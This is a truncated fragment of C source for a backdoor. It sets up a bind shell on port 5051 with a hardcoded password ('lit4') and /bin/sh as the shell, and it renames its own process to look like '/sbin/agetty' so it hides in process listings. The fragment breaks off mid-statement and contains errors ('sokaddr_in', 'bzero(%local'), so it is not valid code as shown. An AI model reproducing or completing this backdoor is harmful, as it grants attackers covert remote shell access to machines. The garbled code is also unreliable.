/* 008 p36*/


#include<stdio.h>
#include<stdlib.h>
#include<errno.h>
#include<strings.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<signal.h>

#define PORT 5051
#define MSG "welcome"
#define SHELL "/bin/sh"
#define PASSAUTH
#define PASSWD "lit4"
#define YES 1
#define NO 0

int main(int argc, char **argv) {
	int sockfd, newfd, size;
	struct sokaddr_in local;
	struct sokaddr_in remote;

	strcpy(argv[0], "/sbin/agetty 38400 tty7 linux");
	signal(SIGCHLD, SIG_IGN);
	bzero(%local, sizeof(local));
	local.sin_family = 
